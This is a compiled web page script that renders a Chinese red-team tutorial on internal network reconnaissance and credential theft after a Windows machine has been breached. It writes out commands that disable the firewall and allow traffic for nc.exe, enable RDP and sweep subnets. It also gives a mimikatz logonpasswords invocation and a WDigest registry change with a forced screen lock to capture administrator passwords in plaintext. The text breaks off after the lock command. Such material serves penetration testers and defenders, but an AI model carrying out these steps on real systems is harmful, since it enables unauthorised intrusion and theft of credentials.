(window.webpackJsonp=window.webpackJsonp||[]).push([[69],{798:function(s,a,t){"use strict";t.r(a);var e=t(105),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"内网信息收集"}},[s._v("内网信息收集 "),t("a",{staticClass:"header-anchor",attrs:{href:"#内网信息收集"}},[s._v("#")])]),s._v(" "),t("blockquote",[t("p",[t("strong",[s._v("信息收集的深度，直接关系到内网渗透测试结果的成败")])])]),s._v(" "),t("p",[t("strong",[s._v("进入内网后，红队专家一般会在本机以及内部网络 开展进一步信息收集和情报刺探工作。")])]),s._v(" "),t("p",[s._v("包括收集当前计算机的网络连接、进程列表、命令执行历史记录、 数据库信息、当前用户信息、管理员登录信息、总结 密码规律、补丁更新频率等信息；")]),s._v(" "),t("p",[s._v("同时对内网的其他机器器的IP、主机名、开放端口服务等情况进行情报刺探。")]),s._v(" "),t("p",[s._v("再利用内网机器不及时修复漏洞、不做安全防护、同口令等弱点来进行横向渗透扩大战果。")]),s._v(" "),t("p",[s._v("对于含有域的内网，红队专家会在扩大战果的同时 去寻找域管理员登录的蛛丝马迹。")]),s._v(" "),t("p",[s._v("一旦发现某台服务 器有域管理员登录，就可以利用Mimikatz等工具去尝试获得登录账号密码明文，或者Hashdump工具去导出 NTLM哈希，继而实现对域控服务器的渗透控制。")]),s._v(" "),t("p",[s._v("在内网漫游过程中，红队专家会重点关注邮件服务 器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位 置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。")]),s._v(" "),t("h2",{attrs:{id:"本机信息收集"}},[s._v("本机信息收集 "),t("a",{staticClass:"header-anchor",attrs:{href:"#本机信息收集"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("用户权限")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v(" /all\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查当前用户在目标系统中的具体权限")]),s._v("\n\nquser\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查当前机器中正在线的用户,注意管理员此时在不在")]),s._v("\n\nnet user        \n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查当前机器中所有的用户名")]),s._v("\n\nnet localgroup\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE")]),s._v("\n\nnet localgroup "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Administrators"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查指定组中的成员列表")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])]),t("p",[t("strong",[s._v("系统基本信息")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("ipconfig /all    \n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#获取本机网络配置")]),s._v("\n\nsysteminfo\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看系统的基本信息（系统版本、软件及补丁的安装情况，是否在域内）")]),s._v("\n\nnet statistics workstation\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看主机开机时间")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" %PROCESSOR_ARCHITECTURE%\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#可查看系统的体系结构，是x86还是AMD64等")]),s._v("\n\ntasklist\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看本机进程列表，分析是否存在VPN杀软等进程")]),s._v("\n\nwmic servcie list brief\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看本机服务信息")]),s._v("\n\nwmic startup get command,caption    \n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看程序启动信息")]),s._v("\n\nschtasks /query /fo LIST /v\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看系统计划任务")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br")])]),t("p",[t("strong",[s._v("网络信息")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("netstat")]),s._v(" -ano\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看本机所有的tcp,udp端口连接及其对应的pid")]),s._v("\n\nnet share\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看本机共享列表，和可访问的域共享列表")]),s._v("\n\nwmic share get name,path,status\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#利用wmic查找共享列表")]),s._v("\n\nREG QUERY "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看代理配置情况")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br")])]),t("p",[t("code",[s._v("wmic")]),s._v("，Windows管理工具，提供了从命令行接口和批命令脚本执行系统管理的支持。")]),s._v(" "),t("p",[s._v("自xp之后系统自带")]),s._v(" "),t("p",[t("strong",[s._v("防火墙的信息和配置（配置防火墙需要管理员权限）")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#显示所有动态入站规则")]),s._v("\nnetsh advfirewall firewall show rule "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("all "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("dir")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("in "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("type")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("dynamic\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#关闭防火墙")]),s._v("\nnetsh advfirewall "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" allprofiles state off\n\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#允许入站")]),s._v("\nnetsh advfirewall firewall "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" rule "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"pass nc"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("dir")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("in "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("action")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("allow "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("program")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"c:'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('c.exe"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#允许出站")]),s._v("\nnetsh advfirewall firewall "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" rule "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Allow nc"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("dir")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("out "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("action")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("allow "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("program")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"c:'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('c.exe"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3389端口放行")]),s._v("\nnetsh advfirewall firewall "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" rule "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"remote Desktop"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("protocol")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("TCP "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("dir")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("in "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("localport")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("action")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("allow\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#自定义防火墙日志存储位置")]),s._v("\nnetsh advfirewall "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" currentprofile logging filename "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"c:\\windows'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\t"}},[s._v("\\t")]),s._v("emp"),t("span",{pre:!0,attrs:{class:"token entity",title:"\\f"}},[s._v("\\f")]),s._v('w.log"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Server 2003及之前的版本")]),s._v("\nnetsh firewall "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" opmode disable\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#关闭防火墙")]),s._v("\nnetsh firewall "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" allowedprogram c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("nc.exe "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"allow nc"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("enable")]),s._v("\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#允许指定程序的全部连接")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br")])]),t("p",[t("strong",[s._v("操作当前机器的远程桌面（RDP）连接服务（开启和关闭RDP，需要管理员权限）")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("wmic RDTOGGLE WHERE "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ServerName")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%COMPUTERNAME%'")]),s._v(" call SetAllowTSConnections "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("    \n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启")]),s._v("\n\nwmic RDTOGGLE WHERE "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ServerName")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%COMPUTERNAME%'")]),s._v(" call SetAllowTSConnections "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("    \n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#关闭")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#下边的命令查询RDP服务的端口，返回一个十六进制的端口")]),s._v("\nREG QUERY "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"')]),s._v(" /V PortNumber\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("h2",{attrs:{id:"主机发现"}},[s._v("主机发现 "),t("a",{staticClass:"header-anchor",attrs:{href:"#主机发现"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("查看各种历史记录（被动主机发现，动静小）")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1、查看bash历史记录")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("history")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" ~/.bash_history\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2、查看hosts文件（看域名绑定），linux & windows")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v("  /etc/hosts\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("type")]),s._v("  c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("drivers"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("etc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("hosts\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3、查看mstsc对内和对外连接记录")]),s._v("\nhttps://github.com/Heart-Sky/ListRDPConnections\n可能发现跨段的连接，还能定位运维人员主机\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#4、浏览器浏览记录")]),s._v("\n查看浏览器中访问过的内网应用\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])]),t("p",[t("strong",[s._v("查看路由表")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("netstat")]),s._v(" -r\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("基于ARP")])]),s._v(" "),t("p",[s._v("arp可以轻易bypass掉各类应用层防火墙，除非是专业的arp防火墙")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("arp -a\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#windows上查看arp缓存")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("基于ICMP")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" /L %I "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1,1")]),s._v(",254"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" DO @ping -w "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" -n "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".2.%I "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" findstr "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"TTL="')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("SPN扫描服务 （域）")])]),s._v(" "),t("p",[s._v("每个重要的服务在域中都有对用的SPN，所以不必使用端口扫描")]),s._v(" "),t("p",[s._v("只需利用SPN扫描就能找到大部分应用服务器")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看当前域内的所有SPN（系统命令）")]),s._v("\nsetspn -q */*\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("端口扫描")])]),s._v(" "),t("p",[s._v("使用fscan扫描C段或B段的高危端口（21,22,445,3389,3306,1443,1521,6379）和Web端口")]),s._v(" "),t("h1",{attrs:{id:"本机密码和散列值获取"}},[s._v("本机密码和散列值获取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#本机密码和散列值获取"}},[s._v("#")])]),s._v(" "),t("h2",{attrs:{id:"lm-hash和ntml-hash"}},[s._v("LM Hash和NTML Hash "),t("a",{staticClass:"header-anchor",attrs:{href:"#lm-hash和ntml-hash"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Windows操作系统中的密码由两部分加密组成，即"),t("code",[s._v("LM Hash")]),s._v("和"),t("code",[s._v("NTML Hash")]),s._v("。")]),s._v(" "),t("p",[s._v("LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用"),t("code",[s._v("0")]),s._v("补全。")]),s._v(" "),t("p",[s._v("自"),t("code",[s._v("Server 2003")]),s._v("之后，Windows的认证方式均为NTML Hash。")]),s._v(" "),t("p",[s._v("自"),t("code",[s._v("Server 2008")]),s._v("开始默认禁用"),t("code",[s._v("LM Hash")]),s._v("， 当密码超过14位时候会采用NTLM加密")]),s._v(" "),t("p",[s._v("如果抓取的"),t("code",[s._v("LM Hash")]),s._v("为 "),t("code",[s._v("AAD3B435B51404EEAAD3B435B51404EE")]),s._v("，说明密码为空或"),t("code",[s._v("LM Hash")]),s._v("被禁用。")]),s._v(" "),t("table",[t("thead",[t("tr",[t("th",{staticStyle:{"text-align":"left"}}),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2003")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("win7")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2008")]),s._v(" "),t("th",{staticStyle:{"text-align":"left"}},[s._v("2012")])])]),s._v(" "),t("tbody",[t("tr",[t("td",{staticStyle:{"text-align":"left"}},[s._v("LM")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}}),s._v(" "),t("td",{staticStyle:{"text-align":"left"}}),s._v(" "),t("td",{staticStyle:{"text-align":"left"}})]),s._v(" "),t("tr",[t("td",{staticStyle:{"text-align":"left"}},[s._v("NTLM")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[s._v("√")])])])]),s._v(" "),t("p",[t("strong",[s._v("Hash一般存储在两个地方")])]),s._v(" "),t("blockquote",[t("p",[t("strong",[s._v("SAM文件")]),s._v("：存储在本机，对应本地用户")]),s._v(" "),t("p",[t("strong",[s._v("NTDS.DIT文件")]),s._v("：存储在域控上，对应域用户")])]),s._v(" "),t("h2",{attrs:{id:"获取凭证的快捷路径"}},[s._v("获取凭证的快捷路径 "),t("a",{staticClass:"header-anchor",attrs:{href:"#获取凭证的快捷路径"}},[s._v("#")])]),s._v(" "),t("p",[s._v("翻用户桌面，可能存在服务器密码信息，甚至其它服务器")]),s._v(" "),t("p",[s._v("找内部wiki手册，邮箱等东西可能存在服务器IP和密码信息")]),s._v(" "),t("h2",{attrs:{id:"server-2012-抓明文密码"}},[s._v("Server 2012 抓明文密码 "),t("a",{staticClass:"header-anchor",attrs:{href:"#server-2012-抓明文密码"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("Server 08 及之前的版本可以直接抓明文密码")])]),s._v(" "),t("p",[s._v("将mimikatz上传到目标主机（需要免杀），并且要SYSTEM权限。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#读取散列值和明文密码")]),s._v("\nmimikatz.exe "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"privilege::debug"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"log"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"sekurlsa::logonpasswords"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#123")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("Server 2012 抓取明文密码：")])]),s._v(" "),t("blockquote",[t("p",[s._v("手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录+导出Hash+本地mimikatz抓明文")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#修改注册表来让Wdigest Auth保存明文口令")]),s._v("\nreg "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" /f\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#恢复")]),s._v("\nreg "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" /f\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("强制锁屏")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("rundll32.exe user32.dll,LockWorkStation\n")])]),s._v(" 